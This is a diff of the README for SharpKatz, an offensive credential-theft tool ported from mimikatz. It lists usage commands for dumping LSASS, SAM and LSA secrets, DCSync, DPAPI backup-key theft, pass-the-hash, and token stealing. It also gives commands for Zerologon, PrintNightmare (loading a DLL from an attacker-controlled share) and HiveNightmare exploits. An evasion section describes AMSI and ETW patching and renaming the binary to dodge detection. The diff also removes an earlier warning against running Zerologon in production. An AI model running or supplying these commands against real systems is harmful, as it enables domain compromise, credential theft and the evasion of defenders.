@@ -1,137 +1,190 @@
 # SharpKatz
-Porting of mimikatz sekurlsa::logonpasswords,  sekurlsa::ekeys and lsadump::dcsync commands
+Porting of mimikatz sekurlsa, lsadump and dpapi commands in C# (.NET 4.8)
+
+## Features
+
+| Category | Command | Description |
+|----------|---------|-------------|
+| **sekurlsa** | `logonpasswords` | Dump credentials from all providers (msv, kerberos, tspkg, credman, wdigest, dpapi) |
+| | `msv` | Retrieve credentials from MSV provider |
+| | `kerberos` | Retrieve credentials from Kerberos provider |
+| | `tspkg` | Retrieve credentials from TsPkg provider |
+| | `credman` | Retrieve credentials from Credential Manager |
+| | `wdigest` | Retrieve credentials from WDigest provider |
+| | `ekeys` | List Kerberos encryption keys |
+| | `sekurlsadpapi` | Dump cached DPAPI masterkeys from LSASS memory |
+| **lsadump** | `dcsync` | DCSync attack — dump credentials from AD via DRS |
+| | `dumpsam` | Dump SAM database from registry hives |
+| | `lsasecrets` | Dump LSA secrets from SECURITY hive |
+| | `lsacache` | Dump cached domain logons (DCC2/mscash2) |
+| | `backupkeys` | Extract DPAPI domain backup keys from DC |
+| **dpapi** | `dpapimasterkey` | Decrypt DPAPI masterkey file (password/hash/domain backup key) |
+| | `dpapiblob` | Decrypt DPAPI-protected blob using masterkeys |
+| **crypto** | `certexport` | Export certificates from local machine store |
+| **exploit** | `zerologon` | CVE-2020-1472 — Netlogon privilege escalation |
+| | `printnightmare` | CVE-2021-1675 / CVE-2021-34527 — PrintSpooler RCE |
+| | `hivenightmare` | CVE-2021-36934 — SAM hive read via shadow copies |
+| **misc** | `pth` | Pass-the-Hash — inject NTLM/AES keys into logon session |
+| | `token` | Token manipulation (list, steal, make, elevate, revert) |
+| | `vault` | Dump Windows Vault credentials |
+| | `spawn` | Spawn process with PPID spoofing |
+| | `listshadows` | Enumerate shadow copies |
 
 ## Usage
 
-### Ekeys
+### sekurlsa
 
-```SharpKatz.exe --Command ekeys```<br>
- list Kerberos encryption keys <br>
- <br>
+```
+SharpKatz.exe --Command logonpasswords
+SharpKatz.exe --Command msv
+SharpKatz.exe --Command kerberos
+SharpKatz.exe --Command tspkg
+SharpKatz.exe --Command credman
+SharpKatz.exe --Command wdigest
+SharpKatz.exe --Command ekeys
+SharpKatz.exe --Command sekurlsadpapi
+```
 
-### Msv
+`logonpasswords` runs all providers including sekurlsa::dpapi in a single pass.
 
-```SharpKatz.exe --Command msv``` <br>
-Retrive user credentials from Msv provider <br>
-<br>
+### lsadump
 
-### Kerberos
+```
+SharpKatz.exe --Command dumpsam --System <system_hive_path> --Sam <sam_hive_path>
+SharpKatz.exe --Command lsasecrets --System <system_hive_path> --Security <security_hive_path>
+SharpKatz.exe --Command lsacache --System <system_hive_path> --Security <security_hive_path>
+```
 
-```SharpKatz.exe --Command kerberos```<br>
-Retrive user credentials from Kerberos provider <br>
-<br>
+**DCSync:**
+```
+SharpKatz.exe --Command dcsync --User user --Domain userdomain --DomainController dc
+SharpKatz.exe --Command dcsync --Guid guid --Domain userdomain --DomainController dc
+SharpKatz.exe --Command dcsync --Domain userdomain --DomainController dc
+```
 
-### Tspkg
+With alternative credentials:
+```
+SharpKatz.exe --Command dcsync --User user --Domain userdomain --DomainController dc --AuthUser authuser --AuthDomain authdomain --AuthPassword authpassword
+```
 
-```SharpKatz.exe --Command tspkg```<br>
-Retrive user credentials from Tspkg provider <br>
-<br>
+**Backup keys (DPAPI domain backup key extraction from DC):**
+```
+SharpKatz.exe --Command backupkeys --DC dc.domain.local
+SharpKatz.exe --Command backupkeys --DC dc.domain.local --OutputDir C:\keys
+```
 
-### Credman
+### dpapi
 
-```SharpKatz.exe --Command credman```<br>
-Retrive user credentials from Credman provider <br>
-<br>
+**Decrypt masterkey file:**
+```
+SharpKatz.exe --Command dpapimasterkey --MasterkeyFile <path> --Sid <user_SID> --Password <password>
+SharpKatz.exe --Command dpapimasterkey --MasterkeyFile <path> --Sid <user_SID> --Hash <SHA1_hash>
+SharpKatz.exe --Command dpapimasterkey --MasterkeyFile <path> --PvkFile <domain_backup_key.pvk>
+SharpKatz.exe --Command dpapimasterkey --MasterkeyFile <path> --BackupKey <hex_backup_key>
+```
 
-### WDigest
+**Decrypt DPAPI blob:**
+```
+SharpKatz.exe --Command dpapiblob --BlobFile <path> --Masterkey <hex_key>
+SharpKatz.exe --Command dpapiblob --BlobFile <path> --MkGuid <GUID> --Masterkey <hex_key>
+SharpKatz.exe --Command dpapiblob --BlobFile <path> --MkFile <masterkey_cache_file>
+```
 
-```SharpKatz.exe --Command wdigest```<br>
-Retrive user credentials from WDigest provider <br>
-<br>
+The masterkey cache file uses `GUID:hex_key` format (one per line). Keys from `sekurlsadpapi` are auto-loaded into the blob cache.
 
-### Logonpasswords
+### crypto
 
-```SharpKatz.exe --Command logonpasswords```<br>
-Retrive user credentials from all providers <br>
-<br>
+```
+SharpKatz.exe --Command certexport
+SharpKatz.exe --Command certexport --CertExport true --CertDir C:\certs
+```
 
-### List shadowcopies
+### Pass-the-Hash
 
-```SharpKatz.exe --Command listshadows```<br>
-Enumerate shadowcopies with NtOpenDirectoryObject and NtQueryDirectoryObject<br>
-<br>
+```
+SharpKatz.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash
+SharpKatz.exe --Command pth --User username --Domain userdomain --Rc4 rc4key
+SharpKatz.exe --Command pth --Luid luid --NtlmHash ntlmhash
+SharpKatz.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash --Aes256 aes256
+```
 
-### Lsadumpsam
+### Token
 
-```SharpKatz.exe --Command dumpsam --System \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SYSTEM --Sam \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\Windows\\System32\\config\\SAM```<br>
-Dump credential from provided sam database<br>
-<br>
+```
+SharpKatz.exe --Command token --Mode list
+SharpKatz.exe --Command token --Mode steal --Pid 1234
+SharpKatz.exe --Command token --Mode make --User admin --Domain CORP --Password pass123
+SharpKatz.exe --Command token --Mode elevate
+SharpKatz.exe --Command token --Mode revert
+```
 
-### Pth
+### Vault
 
-```SharpKatz.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash```<br>
-Perform pth to create a process under userdomain\username credential with ntlm hash of the user's password<br>
-<br>
-```SharpKatz.exe --Command pth --User username --Domain userdomain --Rc4 rc4key```<br>
-Perform pth to create a process under userdomain\username credential user's rc4 key<br>
-<br>
-```SharpKatz.exe --Command pth --Luid luid --NtlmHash ntlmhash```<br>
-Replace ntlm hash for an existing logonsession <br>
-<br>
-```SharpKatz.exe --Command pth --User username --Domain userdomain --NtlmHash ntlmhash --aes256 aes256```<br>
-Perform pth to create a process under userdomain\username credential with ntlm hash of the user's password and aes256 key <br>
-<br>
+```
+SharpKatz.exe --Command vault
+```
 
-### DCSync
+### Spawn (PPID Spoofing)
 
-```SharpKatz.exe --Command dcsync --User user --Domain userdomain --DomainController dc```<br>
-Dump user credential by username <br>
-<br>
-```SharpKatz.exe --Command dcsync --Guid guid --Domain userdomain --DomainController dc```<br>
-Dump user credential by GUID <br>
-<br>
-```SharpKatz.exe --Command dcsync --Domain userdomain --DomainController dc```<br>
-Export the entire dataset from AD to a file created in the current user's temp forder<br>
-<br>
-```SharpKatz.exe --Command dcsync --User user --Domain userdomain --DomainController dc --AuthUser authuser --AuthDomain authdomain --AuthPassword authuserpassword```<br>
-Dump user credential by username using alternative credentials<br>
-<br>
-```SharpKatz.exe --Command dcsync --Guid guid --Domain userdomain --DomainController dc --AuthUser authuser --AuthDomain authdomain --AuthPassword authuserpassword```<br>
-Dump user credential by GUID using alternative credentials<br>
-<br>
-```SharpKatz.exe --Command dcsync --Domain userdomain --DomainController dc --AuthUser authuser --AuthDomain authdomain --AuthPassword authuserpassword```<br>
-Export the entire dataset from AD to a file created in the current user's temp forder using alternative credentials<br>
-<br>
+```
+SharpKatz.exe --Command spawn --Binary C:\Windows\System32\cmd.exe
+SharpKatz.exe --Command spawn --Binary cmd.exe --ParentPid 1234
+SharpKatz.exe --Command spawn --Binary cmd.exe --ParentName svchost
+```
 
-### Zerologon
+### Exploits
 
-No reference to logoncli.dll, using the direct rpc call works even from a [non-domain joined workstation](https://twitter.com/gentilkiwi/status/1306178689630076929)
+**Zerologon (CVE-2020-1472):**
+```
+SharpKatz.exe --Command zerologon --Mode check --Target dc.domain.local --MachineAccount DC$
+SharpKatz.exe --Command zerologon --Mode exploit --Target dc.domain.local --MachineAccount DC$
+SharpKatz.exe --Command zerologon --Mode auto --Target dc.domain.local --MachineAccount DC$ --Domain domain.local --User krbtgt --DomainController dc.domain.local
+```
 
-```SharpKatz.exe --Command zerologon --Mode check --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$```<br>
-Perform Zerologon check <br>
-<br>
-```SharpKatz.exe --Command zerologon --Mode exploit --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$```<br>
-Perform Zerologon attack <br>
-<br>
-```SharpKatz.exe --Command zerologon --Mode auto --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$ --Domain testlab2.local --User krbtgt --DomainController WIN-NSE5CPCP07C.testlab2.local```<br>
-Perform Zerologon attack and dump user credential by username <br>
-<br>
-```SharpKatz.exe --Command zerologon --Mode auto --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$ --Domain testlab2.local --Guid guid --DomainController WIN-NSE5CPCP07C.testlab2.local```<br>
-Perform Zerologon attack and dump user credential by GUID <br>
-<br>
-```SharpKatz.exe --Command zerologon --Mode auto --Target WIN-NSE5CPCP07C.testlab2.local --MachineAccount WIN-NSE5CPCP07C$ --Domain testlab2.local --DomainController WIN-NSE5CPCP07C.testlab2.local```<br>
-Perform Zerologon attack and export the entire dataset from AD to a file created in the current user's temp forder<br>
-<br>
-Note: Do not use zerologon in a production environment or at least plan for recovery actions which are detailed [here](https://github.com/dirkjanm/CVE-2020-1472) 
+**PrintNightmare (CVE-2021-1675 / CVE-2021-34527):**
+```
+SharpKatz.exe --Command printnightmare --Target dc --Library \\\\mycontrolled\\share\\fun.dll
+SharpKatz.exe --Command printnightmare --Target dc --Library \\\\mycontrolled\\share\\fun.dll --AuthUser user --AuthPassword password --AuthDomain dom
+```
 
-### PrintNightmare CVE-2021-1675 - CVE-2021-34527
+**HiveNightmare (CVE-2021-36934):**
+```
+SharpKatz.exe --Command hivenightmare
+```
 
-```SharpKatz.exe --Command printnightmare --Target dc --Library \\\\mycontrolled\\share\\fun.dll```<br>
-Perform PrintNightmare attack <br>
-<br>
-```SharpKatz.exe --Command printnightmare --Target dc --Library \\\\mycontrolled\\share\\fun.dll --AuthUser user --AuthPassword password --AuthDomain dom```<br>
-Perform PrintNightmare attack with provided credentials<br>
-<br>
+### Shadow Copies
 
-### HiveNightmare CVE-2021-36934
+```
+SharpKatz.exe --Command listshadows
+```
 
-```SharpKatz.exe --Command hiveghtmare```<br>
-Exploit HiveNightmare vulnerability selecting the first available shadowcopy <br>
-<br>
+## Evasion Features
 
+- **Direct syscalls** — SSN resolution from clean ntdll on disk, no userland hooks
+- **ETW patching** — Disables Event Tracing before sensitive operations
+- **AMSI patching** — Bypasses Antimalware Scan Interface
+- **Dynamic API resolution** — No static DllImport, all Win32 calls resolved at runtime
+- **String obfuscation** — Sensitive strings built char-by-char at runtime
+- **PPID spoofing** — Spawn processes under arbitrary parent
+- **Costura.Fody** — All dependencies embedded in single assembly
+- **Assembly name** — Compiled as `CredHelper.exe` to avoid signature detection
+
+## DPAPI Attack Chain
+
+A typical DPAPI credential extraction workflow:
+
+1. **`sekurlsadpapi`** — Dump cached masterkeys from LSASS (keys auto-cached)
+2. **`backupkeys`** — Extract domain backup key from DC (alternative: if you have DC access)
+3. **`dpapimasterkey`** — Decrypt user masterkey files using password, hash, or backup key
+4. **`dpapiblob`** — Decrypt DPAPI blobs (Chrome passwords, saved credentials, etc.) using decrypted masterkeys
+
+## Build
+
+- Target: .NET Framework 4.8 (x64)
+- Open `SharpKatz.sln` in Visual Studio and build Release|x64
+- Output: `bin\x64\Release\CredHelper.exe`
 
 ## Credits
 
 This project depends entirely on the work of [Benjamin Delpy](https://twitter.com/gentilkiwi) and [Vincent Le Toux](https://twitter.com/mysmartlogon) on [Mimikatz](https://github.com/gentilkiwi/mimikatz) and [MakeMeEnterpriseAdmin](https://raw.githubusercontent.com/vletoux/MakeMeEnterpriseAdmin/master/MakeMeEnterpriseAdmin.ps1) projects.<br>
-The analysis of the code was conducted following the example from [this blog post](https://blog.xpnsec.com/exploring-mimikatz-part-1/) by [xpn](https://twitter.com/_xpn_).<br>
-<br>
+The analysis of the code was conducted following the example from [this blog post](https://blog.xpnsec.com/exploring-mimikatz-part-1/) by [xpn](https://twitter.com/_xpn_).
